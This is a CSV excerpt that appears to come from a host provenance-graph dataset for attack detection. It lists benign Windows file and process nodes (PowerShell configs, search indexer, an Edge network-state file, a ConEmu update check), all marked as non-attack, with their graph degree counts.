uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
cd6f9fcf-18aa-4f42-9761-dbe72a90404b,{'file': 'powershell.exe'},1647,False,14,0,14,14,0,14
6ceae84c-3624-4b1a-b58a-24c11f0a00db,{'file': 'i:WofCompressedDat'},599,False,13,0,13,13,0,13
5b322267-9364-4de0-81b5-d410230e60a3,"{'subject': '/Icon ""C:\\Users\\victim\\Desktop\\cmder\\icons\\cmder.ico"" /title ""Cmder""'}",954,False,0,3,3,0,13,13
e88c4fc3-e73e-4c65-b084-6c5896000bf8,{'file': '\\Device\\Mup\\;VBoxMiniRdr\\'},944,False,12,0,12,12,0,12
946c3f29-0b87-48d9-ad1e-9175d6031e12,"{'subject': '""C:\\Windows\\system32\\SearchProtocolHost.exe"" Global\\UsGthrFltPipeMssGthrPipe13_ Global\\UsGthrCtrlFltPipeMssGthrPipe13 1 -2147483646 ""Software\\Microsoft\\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc"" ""DownLevelDaemon"" '}",1813,False,0,10,10,0,12,12
041177f0-ed94-42e2-93c8-777d0e8475a7,{'file': 'msedge.exe'},598,False,1,0,1,11,0,11
08340148-99f1-4c70-85c6-e5bc558c6d4b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Network Persistent State'},912,False,6,5,11,6,5,11
217aa97c-ac38-434c-ab0b-99db253e585a,"{'subject': '""C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\ConEmuC64.exe"" -download -async ""Y"" https://conemu.github.io/version.ini ""ConEmuVersion.ini""'}",974,False,0,1,1,0,11,11
4fcf0af1-2d6d-4c52-929b-5863c1ddb3cf,{'subject': 'C:\\Windows\\System32\\RuntimeBroker.exe -Embedding'},312,False,0,6,6,0,10,10
b2139d89-4a69-4a9d-a4ce-e5e8ccd8a6c0,{'file': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe.config'},1649,False,10,0,10,10,0,10
641fcc54-fb4c-4531-aed9-13cee56cfd27,{'file': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config'},1650,False,10,0,10,10,0,10
05be213e-0691-4ce8-94c2-0cf2cb74063c,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\6078762b90671c2ff9ba39318e2176d8\\mscorlib.ni.dll.aux'},1651,False,10,0,10,10,0,10
bc80cfbf-988b-48d8-a5bb-5b0dbf8121b9,{'file': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe.Config'},1653,False,10,0,10,10,0,10
004b26a0-5717-4595-8bde-dfa00e41af25,{'file': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config'},1654,False,10,0,10,10,0,10
